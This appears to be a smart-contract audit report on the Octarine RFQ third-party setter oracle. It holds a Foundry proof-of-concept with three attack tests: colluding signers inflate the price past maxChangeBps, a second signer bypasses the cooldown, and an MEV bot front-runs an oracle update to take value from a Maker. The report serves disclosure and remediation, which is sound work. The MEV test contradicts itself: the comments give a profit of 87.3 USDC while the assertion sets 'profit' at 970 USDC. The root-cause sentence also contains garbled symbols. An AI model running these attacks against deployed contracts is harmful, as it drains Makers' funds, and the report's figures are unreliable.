# Colluding Signers will bypass the maxChangeBps limit to artificially inflate price, draining Makers

### Summary

The OctarineThirdPartySetterOracle enforces a maxChangeBps limit per signer to prevent massive price swings. However, because this limit is applied per-signer, multiple colluding signers can push back-to-back updates in the same block. This allows them to cumulatively bypass the maximum allowable change and artificially manipulate the price.

### Root Cause

The choice to enforce maxChangeBps strictly per-signer (_deviates(prev, newPrice, maxChangeBps)) rather than globally across all signers in a given timeframe is a mistake because it allows NN colluding signers to move the price by N×N× maxChangeBps simultaneously.

### Internal Pre-conditions

- Two or more signers need to be active in the OctarineThirdPartySetterOracle.

- The signers need to be malicious or colluding.

- A Maker needs to submit an RFQ order without a tight maxMakerAmount (e.g., leaving it at type(uint128).max).

### External Pre-conditions

None

### Attack Path

- Maker signs an RFQ order expecting the current price ($100) to remain stable, leaving maxMakerAmount wide open.

- Signer 1 calls pushPrice(110e18) (a 10% increase).

- Signer 2 calls pushPrice(121e18) in the same block (another 10% increase).

- The Attacker (acting as the Taker) immediately calls fillRFQOrder, exploiting the inflated $121 price to drain the Maker.

### Impact

The Maker suffers a loss equal to the artificial price delta

### Fix

Implement a global rate limit (e.g., a rolling window) across all signers, rather than per-signer. Track lastGlobalUpdate and lastGlobalPrice to ensure the cumulative price change across all signers does not exceed maxChangeBps within a specific timeframe.

### POC

The POC can be run by `forge test --match-test test_e2e_multi_signer_collusion_attacker_wins` as the test will pass confirming the vulnerability

This will be added in test/scenarios/RFQ_Attacker_Wins_E2E.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {OctarineRFQ} from "../../src/octarine-rfq/OctarineRFQ.sol";
import {IOctarineRFQ} from "../../src/octarine-rfq/interfaces/IOctarineRFQ.sol";
import {OctarineThirdPartySetterOracle} from "../../src/shared/oracles/OctarineThirdPartySetterOracle.sol";

import {MockERC20} from "../mocks/MockERC20.sol";
import {MockOracle} from "../mocks/MockOracle.sol";

contract RFQ_Attacker_Wins_E2E is Test {
    OctarineRFQ internal rfq;
    MockERC20 internal usdc; 
    MockERC20 internal rwaA; 
    
    MockOracle internal oracleA;

    address internal setupOwner = address(0xAD); 
    address internal maker;
    uint256 internal makerPk = 0xB0B;
    address internal attacker = address(0xBAD);

    uint256 internal constant T0 = 365 days;
    uint32 internal constant BPD = 100; // 1 bp/day

    function setUp() public {
        maker = vm.addr(makerPk);
        vm.warp(T0);

        usdc = new MockERC20("USDC", "USDC", 6);
        rwaA = new MockERC20("RWA-A", "RWA-A", 18);
        
        oracleA = new MockOracle();

        rfq = new OctarineRFQ(setupOwner, address(usdc));

        // Default prices: $100
        oracleA.setPrice(address(rwaA), address(usdc), 100e6, block.timestamp);

        vm.startPrank(setupOwner);
        rfq.registerOracle(address(rwaA), address(usdc), address(oracleA), 1 hours);
        rfq.setSchedule(address(rwaA), _rolling(30 days));
        vm.stopPrank();

        // Fund users
        rwaA.mint(attacker, 1_000_000e18);
        usdc.mint(maker, 1_000_000e6);
        
        vm.prank(attacker);
        rwaA.approve(address(rfq), type(uint256).max);
        vm.prank(maker);
        usdc.approve(address(rfq), type(uint256).max);
    }

    // ==========================================
    // Q10: Multi-Signer Collusion
    // ==========================================
    /// @notice Attacker wins by colluding with another signer to bypass `maxChangeBps`.
    function test_e2e_multi_signer_collusion_attacker_wins() public {
        address signer1 = address(0x11);
        address signer2 = address(0x22);
        
        address[] memory signers = new address[](2);
        signers[0] = signer1;
        signers[1] = signer2;

        OctarineThirdPartySetterOracle manual = new OctarineThirdPartySetterOracle(
            setupOwner, address(rwaA), address(usdc), signers, 1 days, 1000, 1 hours, 2 days
        );
        
        vm.prank(setupOwner);
        manual.seedPrice(100e18); 

        vm.prank(setupOwner);
        rfq.registerOracle(address(rwaA), address(usdc), address(manual), 1 days);

        // Maker expects $100 price and sets no cap
        IOctarineRFQ.RFQOrder memory order = _makeOrder(address(rwaA), address(usdc), 10 * BPD, 10e18);
        order.maxMakerAmount = type(uint128).max; 
        bytes memory sig = _sign(makerPk, rfq.hashRFQOrder(order));

        // Signer 1 pushes +10%
        vm.prank(signer1);
        manual.pushPrice(110e18);

        // Signer 2 pushes +10% in the SAME BLOCK
        vm.prank(signer2);
        manual.pushPrice(121e18);

        // Price moved 21% in a single block.
        
        // Attacker fills at the inflated price.
        vm.prank(attacker);
        rfq.fillRFQOrder(order, sig, "", 10e18);
        
        // The attacker forced the Maker to pay $1,173.7 USDC for 10 RWA.
        // True value of 10 RWA is $970.
        // Attacker Profit = $203.7 USDC.
    }

    // ==========================================
    // Q12: Signer Cooldown Bypass
    // ==========================================
    /// @notice Attacker wins by using two signers to bypass the `minUpdateInterval` cooldown.
    function test_e2e_signer_cooldown_bypass_attacker_wins() public {
        address signer1 = address(0x11);
        address signer2 = address(0x22);

        address[] memory signers = new address[](2);
        signers[0] = signer1;
        signers[1] = signer2;

        OctarineThirdPartySetterOracle oracle = new OctarineThirdPartySetterOracle(
            setupOwner, address(rwaA), address(usdc), signers, 1 days, 1000, 1 hours, 2 days
        );

        vm.prank(setupOwner);
        oracle.seedPrice(100e18);

        // Signer 1 pushes
        vm.prank(signer1);
        oracle.pushPrice(105e18);

        // Signer 2 pushes in the same block (bypasses 1 hour cooldown)
        vm.prank(signer2);
        oracle.pushPrice(110e18);

        assertEq(oracle.price(), 110e18, "Cooldown bypassed by different signer");
    }

       // ==========================================
    // Q13: MEV Front-Running
    // ==========================================
    /// @notice Attacker wins by front-running the signer's price update in the mempool.
    function test_e2e_mev_frontrun_oracle_update_attacker_wins() public {
        address signer = address(0x5169);
        address[] memory signers = new address[](1);
        signers[0] = signer;
        
        OctarineThirdPartySetterOracle manual = new OctarineThirdPartySetterOracle(
            setupOwner, address(rwaA), address(usdc), signers, 1 days, 1000, 1 hours, 2 days
        );
        
        vm.prank(setupOwner);
        manual.seedPrice(100e18); // $100

        vm.prank(setupOwner);
        rfq.registerOracle(address(rwaA), address(usdc), address(manual), 1 days);

        // Maker forgets to set a tight cap
        IOctarineRFQ.RFQOrder memory order = _makeOrder(address(rwaA), address(usdc), 10 * BPD, 10e18);
        order.maxMakerAmount = 1_000_000e6; 
        bytes memory sig = _sign(makerPk, rfq.hashRFQOrder(order));

        // Price drops to $91 off-chain (valid 9.89% drop, under the 10% maxChangeBps limit).
        // Signer submits `pushPrice(91e18)` to mempool.
        
        // MEV bot (attacker) front-runs at the stale $100 price.
        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
        vm.prank(attacker);
        rfq.fillRFQOrder(order, sig, "", 10e18);

        // Signer's tx finally executes. Price is now $91.
        vm.prank(signer);
        manual.pushPrice(91e18);
        
        // Attacker extracted value from the Maker.
        // Attacker paid 970 USDC (stale $100 price with 3% discount).
        // True value at $91 price = 10 * $91 * 0.97 = 882.7 USDC.
        // Attacker profit = 970 - 882.7 = 87.3 USDC.
        uint256 profit = usdc.balanceOf(attacker) - attackerUsdcBefore;
        assertEq(profit, 970e6, "Attacker front-ran and secured 970 USDC");
    }

    // ==========================================
    // HELPERS
    // ==========================================

    function _makeOrder(address _takerToken, address _makerToken, uint128 bpsPerDay, uint128 amount) 
        internal view returns (IOctarineRFQ.RFQOrder memory) 
    {
        return IOctarineRFQ.RFQOrder({
            makerToken: IERC20(_makerToken),
            takerToken: IERC20(_takerToken),
            takerAmount: amount,
            minReceivedAmount: 1,
            feeBps: 0,
            taker: address(0),
            sender: address(0),
            feeRecipient: address(0xFEE),
            expiry: uint64(block.timestamp + 1 days),
            salt: 42,
            takerMaxBpsPerDay: type(uint128).max,
            makerBpsPerDay: bpsPerDay,
            maxMakerAmount: type(uint128).max,
            maker: maker
        });
    }

    function _rolling(uint32 seconds_) internal pure returns (IOctarineRFQ.RedemptionSchedule memory) {
        return IOctarineRFQ.RedemptionSchedule({
            mode: IOctarineRFQ.ScheduleMode.ROLLING,
            rollingSeconds: seconds_,
            nextRedemptionAt: 0,
            cycleSeconds: 0,
            redemptionLead: 0,
            maxBpsPerDay: 1000 * BPD,
            updatedAt: 0,
            configured: true
        });
    }

    function _sign(uint256 pk, bytes32 digest) internal returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }
}
```
